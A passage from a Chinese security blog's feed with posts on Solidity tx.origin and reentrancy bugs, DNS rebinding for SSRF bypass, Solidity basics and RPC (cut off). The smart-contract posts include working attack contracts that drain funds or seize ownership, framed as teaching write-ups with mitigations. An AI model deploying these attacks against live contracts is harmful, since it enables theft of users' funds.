      owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferTo(address dest, uint amount) public &#123;</span><br><span class="line">        require(tx.origin == owner);</span><br><span class="line">        dest.transfer(amount);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该合约将合约所有者 <strong>owner</strong> 变量赋值给 <strong>tx.origin</strong> 变量，所以当 <strong>tx.origin</strong> 值为攻击者的地址时，会向攻击者进行转币操作，以下是攻击者合约。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.11;</span><br><span class="line"></span><br><span class="line">interface TxUserWallet &#123;</span><br><span class="line">    function transferTo(address dest, uint amount) public;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TxAttackWallet &#123;</span><br><span class="line">    address owner;</span><br><span class="line"></span><br><span class="line">    function TxAttackWallet() public &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function() public &#123;</span><br><span class="line">        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设<strong>TxUserWallet</strong> 合约为 <strong>A</strong>，<strong>TxAttackWallet</strong> 合约为 <strong>B</strong>，首先 <strong>A</strong> 向 <strong>B</strong> 发送一定量的以太币，此时 <strong>A</strong> 的 <strong>owner</strong> 为合约 <strong>A</strong> 的地址，然后在 <strong>fallback</strong> 函数中调用 <strong>A</strong> 合约时，<strong>A</strong> 合约中的 <strong>tx.origin</strong> 为合约 <strong>A</strong> 的地址，所以会绕过 <strong>require()</strong> 的判断，完成转币操作。 </p><p>事实上，<strong>tx.origin</strong> 一般为合约拥有者的地址。</p><h4 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h4><p>以 <strong>ethernaut</strong> 中的 <strong>Telephone</strong> 为例，需要成为合约拥有者即可通过该挑战，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.0;</span><br><span class="line"></span><br><span class="line">contract Telephone &#123;</span><br><span class="line"></span><br><span class="line">  address public owner;</span><br><span class="line"></span><br><span class="line">  constructor() public &#123;</span><br><span class="line">    owner = msg.sender;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function changeOwner(address _owner) public &#123;</span><br><span class="line">    if (tx.origin != msg.sender) &#123;</span><br><span class="line">      owner = _owner;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>分析代码可以知道只需要通过 <strong>if</strong> 判断即可设置合约的拥有者，这里使用了 <strong>tx.origin</strong>，使用以下攻击代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Call_Telephone&#123;</span><br><span class="line">    Telephone telephone;</span><br><span class="line">    </span><br><span class="line">    function set_contract(address _Telephone_Addr) public&#123;</span><br><span class="line">        telephone = Telephone(_Telephone_Addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function call_changeOwner() public &#123;</span><br><span class="line">        telephone.changeOwner(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过攻击合约去调用 <strong>Telephone</strong> 合约中的 <strong>changeOwner()</strong> 函数，当调用发生时，<strong>if</strong> 中的 <strong>tx.origin</strong> 为攻击者合约拥有者的地址，而 <strong>msg.sender</strong> 为合约 <strong>Telephone</strong> 的地址，所以通过 <strong>if</strong> 判断，获取合约所有权。</p><h4 id="0x04-漏洞防范"><a href="#0x04-漏洞防范" class="headerlink" title="0x04 漏洞防范"></a>0x04 漏洞防范</h4><p>在智能合约的鉴权机制中减少 <strong>tx.origin</strong>的使用。</p><p>通常使用 <strong>tx.origin</strong> 来区分调用者是一个账户而不是一个合约。</p><p>如：<code>if(msg.sender == tx.origin)</code>，如果调用者是一个账户，则上面的条件永远是 <strong>True</strong>，如果是合约账户，则为 <strong>False</strong>。</p><p>还可以通过<code>extcodesize(addr)</code>来判断地址是否为合约地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract assertContract &#123;</span><br><span class="line">    function isContract(address addr) public view returns (bool) &#123;</span><br><span class="line">    uint256 size;</span><br><span class="line">    assembly &#123; size := extcodesize(addr) &#125;</span><br><span class="line">    return size &gt; 0;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若只允许外部账户调用我们的合约，不允许合约账户调用我们的合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">require(tx.origin == msg.sender)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-原理介绍&quot;&gt;&lt;a href=&quot;#0x01-原理介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 原理介绍&quot;&gt;&lt;/a&gt;0x01 原理介绍&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;tx.origin&lt;/strong&gt; 是 &lt;strong&gt;Solid</summary>
      
    
    
    
    <category term="智能合约" scheme="https://banana69.site/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    
    <category term="智能合约审计" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>DNS Rebinding</title>
    <link href="https://banana69.site/2021/10/06/DNS-Rebinding/"/>
    <id>https://banana69.site/2021/10/06/DNS-Rebinding/</id>
    <published>2021-10-06T07:21:46.000Z</published>
    <updated>2021-10-17T12:14:28.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-概念"><a href="#0x01-概念" class="headerlink" title="0x01 概念"></a>0x01 概念</h4><p><strong>DNS</strong> 重绑定是 <strong>SSRF</strong> 一种过滤绕过的方法，在 <strong>SSRF</strong> 中，一个常用的防护思路是：首先 <strong>DNS</strong> 服务器会对用户请求的 <strong>URL</strong> 参数进行解析，然后对于 <strong>DNS</strong> 服务器返回的 <strong>IP</strong> 地址进行判断，如果在黑名单中，就禁止该次请求。</p><p>但是在该过程中，第一次去请求 <strong>DNS</strong> 服务进行域名解析到第二次服务端去请求 <strong>URL</strong> 之间存在一个时间差，利用这个时间差就可以进行 <strong>DNS</strong> 重绑定攻击。 </p><p>要利用这个时间差就必须了解 <strong>DNS</strong> 生存时间<strong>（Time To Live)<strong>，简单的说就是 <strong>DNS</strong> 记录在 <strong>DNS</strong> 服务器上的缓存时间，</strong>TTL</strong> 值越小，修改记录各地生效的时间就越快。</p><p>当各地的 <strong>DNS (LDNS)</strong> 服务器接受到解析请求时，就会向域名指定的授权 <strong>DNS</strong> 服务器发出解析请求从而获得解析记录；该解析记录会在 <strong>DNS(LDNS)</strong> 服务器中保存一段时间，这段时间内如果再接到这个域名的解析请求，<strong>DNS</strong> 服务器不会再向授权 <strong>DNS</strong> 服务器发出请求，而是直接返回刚才获得的记录；而这个记录在 <strong>DNS</strong> 服务器上保留的时间，就是 <strong>TTL</strong> 值。</p><p>所以，当我们发起域名解析请求的时候，第一次访问会返回一个 <strong>IP</strong> 地址 <strong>A</strong>，但是当我们发起第二次域名解析请求的时候，域名持有者修改对应的 <strong>IP</strong> 地址， 会返回一个不同于 A 的 <strong>IP</strong> 地址 <strong>B</strong>，对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了 <strong>DNS Rebinding</strong> 攻击。</p><h4 id="0x02-过程"><a href="#0x02-过程" class="headerlink" title="0x02 过程"></a>0x02 过程</h4><p>在了解了以上概念以后可以基本明确 <strong>DNS</strong> 重绑定的过程，那么如果控制域名解析到不同的 <strong>IP</strong>，可以通过编写自己可控的 <strong>DNS</strong> 服务器，并将其 <strong>TTL</strong> 值设置为 <strong>0</strong> 或者很小，动态地控制域名解析地 <strong>IP</strong>地址，如下图所示。</p><p><img src="/image/DNS-Rebinding/1.png" alt="1"></p><p>这种 <strong>SSRF</strong> 思路地检查逻辑是在第一次 <strong>DNS</strong> 查询请求后判断 <strong>host</strong> 是否是内网 <strong>IP</strong>，第二次请求的时候存在一个小间隔，导致了解析的差异性。整体步骤可以总结为一下几点：</p><ul><li>服务器端获得 <strong>URL</strong> 参数，进行第一次 <strong>DNS</strong> 解析，获得了一个非内网的 <strong>IP</strong>；</li><li>对于获得的 <strong>IP</strong> 进行判断，发现为非黑名单 <strong>IP</strong>，则通过验证；</li><li>服务器端对于 <strong>URL</strong> 进行访问，由于 <strong>DNS</strong> 服务器设置的 <strong>TTL</strong> 为 <strong>0</strong>，所以再次进行 <strong>DNS</strong> 解析，这一次 <strong>DNS</strong> 服务器返回的是内网地址；</li><li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li></ul><h4 id="0x03-利用"><a href="#0x03-利用" class="headerlink" title="0x03 利用"></a>0x03 利用</h4><p>可以使用 <a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">rebinder </a>测试 <strong>DNS</strong> 重绑定漏洞，该工具可以让一个域名随机绑定俩个IP。本地测试如下：</p><p><img src="/image/DNS-Rebinding/2.png" alt="2"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-概念&quot;&gt;&lt;a href=&quot;#0x01-概念&quot; class=&quot;headerlink&quot; title=&quot;0x01 概念&quot;&gt;&lt;/a&gt;0x01 概念&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;DNS&lt;/strong&gt; 重绑定是 &lt;strong&gt;SSRF&lt;/strong&gt; 一种</summary>
      
    
    
    
    <category term="Web" scheme="https://banana69.site/categories/Web/"/>
    
    
    <category term="DNS" scheme="https://banana69.site/tags/DNS/"/>
    
  </entry>
  
  <entry>
    <title>浅入理解重入漏洞（Re-Entrance）</title>
    <link href="https://banana69.site/2021/09/30/%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>https://banana69.site/2021/09/30/%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-09-30T07:34:10.000Z</published>
    <updated>2021-10-17T12:15:56.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h4><p>重入漏洞可以理解为递归调用漏洞。在以太坊智能合约中，调用外部合约或将Ether发送到其他地址的操作需要合约提交外部调用，这些外部调用可能被攻击者劫持，迫使合约执行其他代码，导致重新进入逻辑。例如从账户提现时，提现后系统对余额没有立即更新，导致可以循环利用不停提现，直至消耗完合约内部的余额。</p><p>这里首先需要了解以太坊中的几种转币方式和 fallback() 函数：</p><p><strong>(1) 转币方式</strong></p><p>在<strong>Solidity</strong>中<code>&lt;address&gt;.transfer()</code>，<code>&lt;address&gt;.send()</code> 和 <code>&lt;address&gt;.gas().call.vale()()</code> 都可以用于向某一地址发送 ether，他们的区别在于：</p><ul><li><p><strong><address>.transfer()</strong></p><p>当发送失败后会回滚到之前的状态，并且只传递 <strong>2300 Gas</strong>供调用，可以防止重入。</p></li><li><p><strong><address>.send()</strong></p><p>当发送失败后会返回 <strong>false</strong>，只会传递 <strong>2300 Gas</strong>供调用，可以防止重入。</p><blockquote><p>有部分早期的智能合约使用send()转币时会忽略掉其返回值，致使转币失败后后续的代码也可以继续执行。</p></blockquote></li><li><p><strong><address>.gas().call.value()()</strong></p><p>当发送失败后会返回<strong>false</strong>，但是会传递所有可用的 <strong>Gas</strong> 供调用，虽然可以对gas(gas_value)进行限制，但是不能有效防止重入。</p></li></ul><p><strong>(2) fallback() 函数</strong></p><p>智能合约中可以唯一存在一个未命名的函数，称为回退(<strong>fallback</strong>)函数，该函数不能有实参，不能有返回任何值。执行回退函数需要几个条件：</p><ul><li>当外部账户或其他合约向该合约地址发送<strong>Ether</strong>时，回退函数会被调用。</li><li>当外部账户或其他合约向该合约地址发送<strong>Ether</strong>，但是内部没有回退函数时会抛出异常，然后此次交易将会被取消，<strong>Ether</strong>也会被退还。</li><li>当外部账户或其他合约调用了一个该合约中不存在的函数时，回退函数将会被调用。</li></ul><p>(3) <strong>payable</strong> 修饰符</p><p>在函数上增加payable修饰符时，表示该函数可以接受 <strong>Ether</strong>，并且会把接收的 <strong>Ether</strong> 存储在当前的合约中。</p><h4 id="0x02-代码分析"><a href="#0x02-代码分析" class="headerlink" title="0x02 代码分析"></a>0x02 代码分析</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.19;</span><br><span class="line"> </span><br><span class="line">contract Victim &#123;</span><br><span class="line">    mapping(address =&gt; uint) public userBalannce;</span><br><span class="line">    uint public amount = 0;</span><br><span class="line">    function Victim() payable&#123;&#125;</span><br><span class="line">    function withDraw()&#123;</span><br><span class="line">        uint amount = userBalannce[msg.sender];</span><br><span class="line">        if(amount &gt; 0)&#123;</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">            userBalannce[msg.sender] = 0;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function() payable&#123;&#125;</span><br><span class="line">    function receiveEther() payable&#123;</span><br><span class="line">        if(msg.value &gt; 0)&#123;</span><br><span class="line">            userBalannce[msg.sender] += msg.value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function showAccount() public returns (uint)&#123;</span><br><span class="line">        amount = this.balance;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上代码实现了一个类似银行的功能，可以存入或取出 <strong>Ether</strong>，但存在重入漏洞。这里转币时使用<code>call.value()()</code>的方式，该函数会将剩余的 <strong>Gas</strong> 全部用于外部调用（fallback() 函数），所以当进行交易时若目标地址为一个合约地址则会默认调用该函数的 <strong>fallback</strong> 函数。</p><p>从以上合约的代码中可以看出，在执行<code> msg.sender.call.value(_amount)();</code>向目标地址发送 <strong>Ether</strong> 存在一个递归问题，并未执行下一步的减币操作，因此存在重入漏洞。</p><p>重入漏洞存在的条件：</p><ul><li><p>合约调用有足够的 <strong>Gas</strong></p></li><li><p>具有转账功能（<strong>payable</strong> 修饰符）</p></li><li><p>状态变量在重入函数调用之后</p></li></ul><p>攻击者合约</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract Attacker&#123;</span><br><span class="line">    uint public amount = 0;</span><br><span class="line">    uint public test = 0;</span><br><span class="line">    function Attacker() payable&#123;&#125;</span><br><span class="line">    function() payable&#123;</span><br><span class="line">        test++;</span><br><span class="line">        Victim(msg.sender).withDraw();</span><br><span class="line">    &#125;</span><br><span class="line">    function showAccount() public returns (uint)&#123;</span><br><span class="line">        amount = this.balance;</span><br><span class="line">        return this.balance;</span><br><span class="line">    &#125;</span><br><span class="line">    function sendMoney(address addr)&#123;</span><br><span class="line">        Victim(addr).receiveEther.value(1 ether)();</span><br><span class="line">    &#125;</span><br><span class="line">    function reentry(address addr)&#123;</span><br><span class="line">        Victim(addr).withDraw();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行步骤：</p><ol><li>攻击者合约向受害者合约存入1个 <strong>Ether</strong></li><li>攻击者合约从受害者合约取出存入的 <strong>Ether</strong>，攻击者合约地址收到 <strong>Ether</strong> 时未指定其他有效函数，会默认调用 <strong>fallback</strong> 函数</li><li>执行攻击者合于中的 <strong>fallback</strong> 函数，不断循环给攻击者合约转币。</li></ol><h4 id="0x03-漏洞复现"><a href="#0x03-漏洞复现" class="headerlink" title="0x03 漏洞复现"></a>0x03 漏洞复现</h4><ol><li><p>首先将以上俩个合约写到一个文件中并分别部署到区块链上，如下图所示，使用 <strong>JavaScript VM</strong>环境。</p><blockquote><p>注意：在部署合约时需要设置 <strong>Value</strong>，这里设置为20 <strong>Ether</strong>.</p></blockquote><p><img src="/image/%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/1.png" alt="1"></p></li><li><p>使用攻击合约向存在漏洞的合约存入<strong>1 Ether</strong>。</p><p><img src="/image/%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/2.png" alt="2"></p></li><li><p>此时在受害者合约中可以查看到攻击者已经存入<strong>1 Ether</strong>。</p><p><img src="/image/%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/3.png" alt="3"></p></li><li><p>在攻击者合约中进行攻击。</p><blockquote><p>此时攻击者合约会调用受害者合约中的 <strong>withdraw()</strong> 函数，从受害者合约中取出币后发送到攻击者合约，但因攻击者合约收到币后并未执行相应操作，所以会执行 <strong>fallback()</strong> 函数，即会递归调用 <strong>withdraw()</strong> 函数，造成重入攻击。</p></blockquote><p><img src="/image/%E9%87%8D%E5%85%A5%E6%BC%8F%E6%B4%9E/4.png" alt="4"></p><p>在攻击结束后查看攻击者账户，已经将受害者账户中的全部 <strong>Ether</strong> 取出。</p></li></ol><h4 id="0x03-缓解措施"><a href="#0x03-缓解措施" class="headerlink" title="0x03 缓解措施"></a>0x03 缓解措施</h4><p>可以设计更加规范的代码范来规避重入漏洞，例如：</p><ul><li><p>将金额更新代码放至合理的位置，使账户金额先更新再调用；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withDraw()&#123;</span><br><span class="line">        uint amount = userBalannce[msg.sender];</span><br><span class="line">        userBalances[msg.sender] = 0 //先进行更新</span><br><span class="line">        if(amount &gt; 0)&#123;</span><br><span class="line">        msg.sender.call.value(amount)();</span><br><span class="line">            userBalannce[msg.sender] = 0;</span><br></pre></td></tr></table></figure></li><li><p>尽可能使用 <strong>Solididy</strong> 的内置函数 <strong>transfer()</strong> 将 <strong>Ether</strong> 发送给外部合约，在转账时只发送 <strong>2300 Gas</strong>，无法调用其他合约；</p></li><li><p>确保状态变量的更新发生在 <strong>Ether</strong> 被发送或者任何外部合约调用之前，即使用<code>检查 - 生效 - 交互</code>模式；</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;= _amount) &#123;//检查</span><br><span class="line">       balances[msg.sender] -= _amount;//生效</span><br><span class="line">       msg.sender.transfer(_amount);//交互</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></li><li><p>转换发送模式为提款模式，使收款方控制 <strong>Ether</strong> 的转移，减少其他逻辑和提款逻辑的耦合；</p></li><li><p>添加状态变量使其在代码执行时锁定合约，防止重入调用；</p></li><li><p>明确 <strong>transfer</strong>、<strong>send</strong>、<strong>call</strong> 的区别，防范对 <strong>Gas</strong> 的滥用。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-漏洞原理&quot;&gt;&lt;a href=&quot;#0x01-漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞原理&quot;&gt;&lt;/a&gt;0x01 漏洞原理&lt;/h4&gt;&lt;p&gt;重入漏洞可以理解为递归调用漏洞。在以太坊智能合约中，调用外部合约或将Ether发送到</summary>
      
    
    
    
    <category term="智能合约" scheme="https://banana69.site/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>初识Solididy合约结构</title>
    <link href="https://banana69.site/2021/09/22/%E5%88%9D%E8%AF%86Solididy/"/>
    <id>https://banana69.site/2021/09/22/%E5%88%9D%E8%AF%86Solididy/</id>
    <published>2021-09-22T01:24:02.000Z</published>
    <updated>2021-10-06T06:22:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>在<strong>Solidity</strong>中，合约类似于面向对象编程语言中的类。每个合约都可以包含状态变量、函数、函数修饰器、事件、结构类型和枚举类型的声明，且合约可以从其他合约继承。</p><h4 id="0x01-状态变量"><a href="#0x01-状态变量" class="headerlink" title="0x01 状态变量"></a>0x01 状态变量</h4><p>状态变量是永久地存储在合约存储中的值。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">contract SimpleStorage&#123;</span><br><span class="line">uint storedData; //状态变量</span><br><span class="line"> // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x02-函数"><a href="#0x02-函数" class="headerlink" title="0x02 函数"></a>0x02 函数</h4><p>函数是合约中代码的可执行单元。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract SimpleAuction &#123;</span><br><span class="line">    function bid() public payable &#123; // 函数</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数调用可发生在合约内部或外部，且函数对其他合约有不同成都的可见性。</p><h4 id="0x03-函数修饰器"><a href="#0x03-函数修饰器" class="headerlink" title="0x03 函数修饰器"></a>0x03 函数修饰器</h4><p>函数修饰器可以用来以声明的方式改良函数语义。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.22;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    address public seller;</span><br><span class="line"></span><br><span class="line">    modifier onlySeller() &#123; // 修饰器</span><br><span class="line">        require(</span><br><span class="line">            msg.sender == seller,</span><br><span class="line">            &quot;Only seller can call this.&quot;</span><br><span class="line">        );</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function abort() public onlySeller &#123; // Modifier usage</span><br><span class="line">        // ...</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x05-事件"><a href="#0x05-事件" class="headerlink" title="0x05 事件"></a>0x05 事件</h4><p>事件能方便地调用以太坊虚拟机日志功能的接口。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line">contract SimpleAuction &#123;</span><br><span class="line">    event HighestBidIncreased(address bidder, uint amount); // 事件</span><br><span class="line"></span><br><span class="line">    function bid() public payable &#123;</span><br><span class="line">        // ...</span><br><span class="line">        emit HighestBidIncreased(msg.sender, msg.value); // 触发事件</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x06-结构类型"><a href="#0x06-结构类型" class="headerlink" title="0x06 结构类型"></a>0x06 结构类型</h4><p>结构是可以将几个变量分组的自定义类型。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Ballot &#123;</span><br><span class="line">    struct Voter &#123; // 结构</span><br><span class="line">        uint weight;</span><br><span class="line">        bool voted;</span><br><span class="line">        address delegate;</span><br><span class="line">        uint vote;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="0x07-枚举类型"><a href="#0x07-枚举类型" class="headerlink" title="0x07 枚举类型"></a>0x07 枚举类型</h4><p>枚举可用来创建由一定数量的”常量值”构成的自定义类型。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line"></span><br><span class="line">contract Purchase &#123;</span><br><span class="line">    enum State &#123; Created, Locked, Inactive &#125; // 枚举</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;在&lt;strong&gt;Solidity&lt;/strong&gt;中，合约类似于面向对象编程语言中的类。每个合约都可以包含状态变量、函数、函数修饰器、事件、结构类型和枚举类型的声明，且合约可以从其他合约继承。&lt;/p&gt;
&lt;h4 id=&quot;0x01-状态变量&quot;&gt;&lt;a href=&quot;#0x01-状</summary>
      
    
    
    
    <category term="区块链" scheme="https://banana69.site/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
    
    <category term="智能合约" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>远程过程调用RPC</title>
    <link href="https://banana69.site/2021/09/16/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8RPC/"/>
    <id>https://banana69.site/2021/09/16/%E8%BF%9C%E7%A8%8B%E8%BF%87%E7%A8%8B%E8%B0%83%E7%94%A8RPC/</id>
    <published>2021-09-16T14:34:44.000Z</published>
    <updated>2021-10-06T06:22:16.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-概念介绍"><a href="#0x01-概念介绍" class="headerlink" title="0x01 概念介绍"></a>0x01 概念介绍</h4><p><strong>RPC</strong>即远程过程调用<strong>（Remote Procedure Call）</strong>。如下图所示，<strong>RPC</strong>指在计算机<strong>A</strong>上的进程掉用另外一台计算机<strong>B</strong>上的进程，<strong>A</strong>上的进程被挂起时，<strong>B</strong>上被调用的进程开始执行，当值返回给<strong>A</strong>时，<strong>A</strong>进程继续执行，调用方可以通过使用参数将信息传送给被调用方，然后通过传回的结果得到信息。<img src="/image/RPC/1.png" alt="1">)</p><blockquote><p>client stub：存放服务端的地址信息，将客户端的请求参数打包成网络数据后通过网络远程发送给服务方。</p><p>server stub：接受客户端发送过来的消息，将消息解包，并调用本地的方法。</p></blockquote><p>远程过程调用采用<strong>Client/Server</strong>模式。请求程序就是一个<strong>Client</strong>，服务提供程序即为服务器。远程过程调用是同步操作，这一点与本地过程调用类似，在远程过程结果返回之前，需要暂时中止请求程序。<strong>使用相同地址空间的低权进程或低权线程允许同时运行多个远程过程调用。</strong></p><p>整个<strong>RPC</strong>的过程可以理解为以下步骤：</p><ol><li><strong>Client</strong>调用进程发送一个带有进程参数的调用信息到服务进程，然后等待应答信息。</li><li><strong>Server</strong>处于等待状态知道调用信息到达，当调用信息到达后，服务器获得参数，计算结果并发送回复信息并等待下一个信息到来。</li><li><strong>Client</strong>接受到答复信息，获取回复结果并继续执行。</li></ol><h4 id="0x02-实现原理"><a href="#0x02-实现原理" class="headerlink" title="0x02 实现原理"></a>0x02 实现原理</h4><p>首先理解本地过程调用的实现，以下面C语言的调用为例：</p><p><code>count = read(fd, buf, nbytes);</code></p><p>以上代码中，<strong>fd</strong>为整数型，表示一个文件；<strong>buf</strong>为一个字符数组，用于存储读入的数据；<strong>nbytes</strong>为另一个整数型，用于记录实际读入的字节数。如果该调用位于主程序中，那么在调用之前堆栈的状态如下图所示。</p><p><img src="/image/RPC/2.png" alt="2"></p><p>为了进行调用，调用方首先把参数反序压入堆栈，即为最后一个参数先压入，如下图所示。在<strong>read</strong>函数运行完成后，它将返回值放入某个寄存器中，移出返回地址，并将控制权交回给调用方，然后调用方将参数从堆栈中移出，使堆栈还原到初始的状态。</p><p><img src="/image/RPC/3.png" alt="3"></p><p><strong>RPC</strong>的思想是尽量使远程过程调用具有域本地调用相同的形式，假设程序需要从某个文件读取数据，通过调用<strong>read</strong>函数来获取数据。在传统的系统中，read由链接器从库中提取出来，然后链接器再将它插入目标程序中。<strong>read</strong>过程是一个短过程，一般通过执行一个等效的<strong>read</strong>系统调用来实现，<strong>read</strong>过程是一个位于童虎代码和本地操作系统之间的接口。虽然<strong>read</strong>执行了系统调用，但是它本身依然是通过将参数压入堆栈的常规方式调用的。</p><p><strong>RPC</strong> 是通过类似的途径来获得透明性。当 <strong>read</strong> 实际上是一个远程过程时（比如在文件服务器所在的机器上运行的过程），库中就放入 <strong>read</strong> 的另外一个版本，称为客户存根<strong>（client stub）</strong>。这种版本的 <strong>read</strong> 过程同样遵循上图的调用次序，这点与原来的 <strong>read</strong> 过程相同。另一个相同点是其中也执行了本地操作系统调用。唯一不同点是它不要求操作系统提供数据，而是将参数打包成消息，而后请求此消息发送到服务器，如下图所示。在对 <strong>send</strong> 的调用后，客户存根调用 <strong>receive</strong> 过程，随即阻塞自己，直到收到响应消息。</p><p><img src="/image/RPC/4.png" alt="4"></p><p>当消息到达服务器时，服务器上的操作系统将它传递给服务器存根<strong>（server stub）</strong>。服务器存根一般先调用 <strong>receive</strong> ，然后被阻塞，等待消息输入。收到消息后，服务器将参数由消息中提取出来，然后以常规方式调用服务器上的相应过程。调用完后，服务器存根要将控制权教会给客户发出调用的过程，它将结果（缓冲区）打包成消息，随后调用 <strong>send</strong> 将结果返回给客户。然后服务器存根一般会再次调用 <strong>receive</strong>，等待下一个输入的请求。</p><p>客户机器接收到消息后，客户操作系统发现该消息属于某个客户进程（实际上该进程是客户存根，只是操作系统无法区分二者）。操作系统将消息复制到相应的缓存区中，随后解除对客户进程的阻塞。客户存根检查该消息，将结果提取出来并复制给调用者，而后以通常的方式返回。当调用者在 <strong>read</strong> 调用进行完毕后重新获得控制权时只能得到所需的数据，无法确认操作是在本地操作系统进行，还是远程完成。</p><p>概况来说，远程过程调用包含如下步骤：</p><ul><li>客户过程以正常的方式调用客户存根；</li><li>客户存根生成一个消息，然后调用本地操作系统；</li><li>客户端操作系统将消息发送给远程操作系统；</li><li>远程操作系统将消息交给服务器存根；</li><li>服务器存根调将参数提取出来，而后调用服务器；</li><li>服务器执行要求的操作，操作完成后将结果返回给服务器存根；</li><li>服务器存根将结果打包成一个消息，而后调用本地操作系统；</li><li>服务器操作系统将含有结果的消息发送给客户端操作系统；</li><li>客户端操作系统将消息交给客户存根；</li><li>客户存根将结果从消息中提取出来，返回给调用它的客户存根。</li></ul><h4 id="0x03-产生原因"><a href="#0x03-产生原因" class="headerlink" title="0x03 